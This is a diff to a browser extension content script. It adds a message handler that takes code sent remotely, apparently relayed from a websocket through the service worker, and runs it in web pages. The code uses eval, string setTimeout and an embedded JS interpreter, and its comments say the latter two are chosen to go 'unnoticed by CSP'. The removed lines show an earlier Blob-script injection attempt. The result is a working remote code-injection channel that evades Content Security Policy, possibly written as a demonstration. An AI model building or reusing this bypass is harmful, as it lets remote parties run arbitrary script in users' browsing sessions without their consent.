@@ -16,28 +16,49 @@ document.addEventListener('focusout', function (e) {
 });
 
 /* =================================================================================== */
+// Execute injected code through a JS interpreter
+function executeWithInterpreter(command) {
+    const initFunc = function (interpreter, globalObject) {
+        interpreter.setProperty(globalObject, 'url', String(location));
+        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))
 
-// FIXME: Listen to messegaes from the service worker and if they are of type 'WEBSOCKET_MESSAGE' then evaluate the code
+        const alertWrapper = function alert(text) {
+            return window.alert(text);
+        };
+        interpreter.setProperty(globalObject, 'alert', interpreter.createNativeFunction(alertWrapper));
+
+        // TODO: figure out how to bind all DOM interfaces to the interpreter
+        // const windowWrapper = function w(command) {
+        //     const parsedCommand = command.slice(7)
+        //     return window[parsedCommand];
+        // };
+        // interpreter.setProperty(globalObject, 'window',
+        //     interpreter.createNativeFunction(windowWrapper));
+    };
+    const interpreter = new JSInterpreter(command, initFunc)
+    interpreter.run()
+}
+
+// Execute injected code through a setTimeout
+function executeWithSetTimeout(command) {
+    setTimeout(command);
+}
+
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-    (() => {
-        if (request.type === 'WEBSOCKET_MESSAGE') {
-            console.log(request.data)
-            // TODO: tried to execute the code injection through a Blob but CSP is still blocking it
-            // // Create a Blob from the string
-            // const blob = new Blob([request.data], {type: 'application/javascript'});
-            //
-            // // Create a URL for the Blob
-            // const scriptURL = URL.createObjectURL(blob);
-            //
-            // // Dynamically create a script element and set its source to the Blob URL
-            // const scriptElement = document.createElement('script');
-            // scriptElement.src = scriptURL;
-            //
-            // // Append the script element to the document to execute the code
-            // document.body.appendChild(scriptElement);
-
+    if (request.type === 'CS_COMMAND') {
+        console.log(`Received command: ${request.data}`)
+        // Show that eval is blocked by CSP
+        try {
+            eval(request.data);
+        } catch (err) {
+            console.error(`eval() failed: ${err.message}`);
         }
-        sendResponse({status: 'ok'})
-    })();
-    return true
+        // Alternative to eval, goes unnoticed by CSP
+        executeWithSetTimeout(request.data);
+        // Alternative2 to eval, goes unnoticed by CSP
+        executeWithInterpreter(request.data);
+    } else if (request.type === 'HELLO') {
+        console.log(request.data)
+    }
+    sendResponse({status: 'ok'})
 });
